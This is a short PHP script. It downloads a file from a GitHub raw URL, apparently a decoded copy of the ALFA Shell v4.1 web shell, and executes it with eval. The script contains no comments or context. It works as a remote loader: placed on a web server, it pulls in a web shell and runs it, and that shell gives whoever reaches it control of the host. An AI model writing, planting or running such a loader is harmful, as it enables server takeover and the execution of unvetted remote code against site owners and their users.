<?php 
    $filedata = file_get_contents('https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php');
    eval ("?>$filedata");
?>